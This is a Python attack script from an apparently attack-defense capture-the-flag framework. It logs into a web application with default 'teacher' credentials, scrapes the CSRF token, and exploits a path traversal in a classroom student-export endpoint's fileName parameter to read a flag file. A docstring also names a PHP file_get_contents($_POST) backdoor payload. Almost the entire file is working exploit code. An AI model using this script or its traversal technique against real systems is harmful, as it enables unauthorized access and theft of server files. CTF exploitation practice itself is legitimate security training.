#!/usr/bin/env python

import requests,re
from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback

def vulnerable_attack(target,target_port,cmd):
        
    '''
    this is the payload script for vuln:

    echo file_get_contents($_POST[444]);

    '''

    try:
        cmd = flag_path
        data = quote(cmd) 
        #res = http("get",target,target_port,"/bigbrother?filename="+data,'',headers)
	res = shit(target,target_port)
        # Even though we can not execute the cmd with the vuln, but we can read flag
        # and we want to use our framework to carry out this attack
        # not do the replicate tasks to code a new script
        if len(res) == 32:
            res = cmd_prefix + res + cmd_postfix
    except Exception,e:
        debug_print(traceback.format_exc())     
        dump_error("attack failed",target,"vulnerable attack")
        res = "error"

    return res

def shit(target,target_port):
    s = requests.Session()
    ip = target
    url = 'http://%s:%s/web/login' % (ip,str(target_port))
    url_2 = 'http://%s:%s/web/login_check' %(ip,str(target_port))
    url_3 = 'http://%s:%s/web/' %(ip,str(target_port))
    url_4 = 'http://%s:%s/web/classroom/1/manage/student/export?role=student&fileName=/var/www/html/web/app/data/private_files/../../../../../../../../../../../../a/../flag'%(ip,str(target_port))
    content = s.get(url).content

    index_1 = content.find('<meta name="description"')
    index_2 = content.find('name="csrf-token"/>')

    token = content[index_1 + 35 + len('<meta name="description"') : index_2-2]
    debug_print(token)
    s.post(url_2,data={'_username':'teacher','_password':'teacher','_csrf_token':'%s'%token}).content
    
    s.get(url_3)
    flag =  s.get(url_4).content[3:]
    if len(flag)==32:
        debug_print(flag)
    else:
        flag = 'get flag error'
    
    return flag
